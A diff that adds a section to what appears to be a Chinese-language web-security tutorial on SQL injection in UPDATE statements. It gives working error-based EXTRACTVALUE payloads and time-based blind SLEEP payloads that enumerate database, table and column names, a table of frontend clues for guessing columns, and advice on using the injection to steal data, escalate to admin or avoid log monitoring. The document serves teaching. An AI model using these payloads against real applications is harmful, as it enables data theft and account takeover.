@@ -1069,6 +1069,82 @@ $email = $_POST['email'];
 $sql = "UPDATE users SET email = '$email' WHERE id = $user_id";
 ```
 
+#### 实战流程：先摸清结构，再构造 payload
+
+在实际黑盒渗透中，攻击者不会一上来就用 `email=(SELECT ...)` 这种需要已知表名和列名的 payload。完整的 UPDATE 注入流程分为两个阶段。
+
+##### 阶段一：信息收集（摸清数据库结构）
+
+利用报错注入或盲注，在不修改核心数据的前提下获取数据库名、表名、列名。
+
+**路径 A：有报错回显（最快，优先使用）**
+
+```sql
+-- Step 1: 获取当前数据库名
+-- 在 email 输入框输入：
+test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1
+-- 报错信息：XPATH syntax error: '~shop_db'
+
+-- Step 2: 获取所有表名
+test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='shop_db'))) AND '1'='1
+-- 报错信息：XPATH syntax error: '~users,orders,products'
+
+-- Step 3: 获取 users 表的列名
+test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='shop_db' AND TABLE_NAME='users'))) AND '1'='1
+-- 报错信息：XPATH syntax error: '~id,username,password,email,role'
+```
+
+至此，你已经掌握了目标表结构：数据库 `shop_db`，表 `users`，列 `id, email, password, role`。接下来的利用 payload 就可以精准靶向这些名字。
+
+**路径 B：没有报错回显（时间盲注，慢但通用）**
+
+```sql
+-- 判断数据库名长度
+test' OR IF(LENGTH(DATABASE()) = 7, SLEEP(3), 0) OR '
+-- 等待 3 秒 → 长度为 7
+
+-- 逐字符猜数据库名第一个字母（二分法加速）
+test' OR IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) > 109, SLEEP(3), 0) OR '
+-- 无延时 → ASCII ≤ 109，缩小范围继续...
+-- 最终确定 → 第一个字符为 's'
+
+-- ... 以此类推逐个字符猜出完整库名、表名、列名
+```
+
+> 💡 **实际渗透中优先尝试报错注入**，速度差距巨大：报错注入一个 payload 几毫秒出完整表名，时间盲注猜一个字符就要等好几秒，猜完整结构可能耗时数十分钟。
+
+**辅助线索：利用前端信息直接猜测字段名**
+
+有时不需要跑完完整的信息收集流程，页面本身就暴露了大量线索：
+
+| 线索来源 | 推断方式 | 示例 |
+|---------|---------|------|
+| 表单字段名 | `<input name="email">` → 数据库列名大概率就是 `email` | `name="password"` → 对应 `password` 列 |
+| URL 参数 | `?user_id=123` 或 `?id=1` | 表/列名中包含 `id` |
+| 页面/功能名称 | "修改个人资料"页面 | 表名可能是 `users`、`profile` |
+| 已知开源系统 | CMS/框架的数据库结构公开可查 | WordPress 的 `wp_users` 表结构直接查源码 |
+| HTML 注释 | 前端注释中偶尔泄露表结构 | `<!-- users.email, users.phone -->` |
+| API 响应 | JSON 字段名通常对应数据库列名 | `{"email":"test@xx.com"}` → 有 `email` 列 |
+
+阶段一跑完或结合线索推测出字段名后，就可以进入阶段二——利用已知结构构造攻击 payload。这就是接下来每种利用手法的前提：**下面的例子都假设你已经拿到了表结构**。
+
+> ⚠️ **一个自然的问题**：既然阶段一用报错注入拿到了表结构，为什么不继续用报错注入直接把密码也爆出来，而要绕一圈写到 email 字段？
+> 
+> 答案是：**根据场景选最合适的通道，没有一招通吃的方案。**
+> 
+> | 场景 | 推荐方式 | 原因 |
+> |------|---------|------|
+> | 有报错回显 | 继续用报错注入 | 最快，`EXTRACTVALUE` 一行爆数据 |
+> | **报错回显被关闭**（阶段一只能靠时间盲注摸结构） | SET 写入可见字段 | 盲注摸结构已经够慢了，爆数据用 SET 一锤子写进去更快 |
+> | 要偷的数据很长（如 200 字符的 token） | SET 写入可见字段 | 报错注入单次只回显 32 字符，需多次 SUBSTRING 分段 |
+> | 要偷的数据很短（如密码 hash）且报错可用 | 报错注入 | 一行搞定，不必费劲改数据 |
+> | 操作日志监控很严，频繁报错容易被发现 | SET 写入可见字段 | 一次成功的 UPDATE 比多次报错更隐蔽 |
+> | 只想**直接拿到权**而非偷数据 | 修改密码 / 提权 | 直接把 admin 密码改了或者把自己 role 改成 admin |
+> 
+> 所以下面这些利用手法**不是流水线上的先后步骤**，而是工具箱里的不同工具——根据实际约束选顺手的那把。
+
+---
+
 ##### 1. 通过 SET 子句窃取数据
 
 攻击者可以将自己的某个字段值修改为其他用户的敏感数据。**关键**：必须先用 `'` 闭合原有的字符串上下文，让子查询出现在引号**外部**，否则子查询会被当成普通字符串而不会执行。
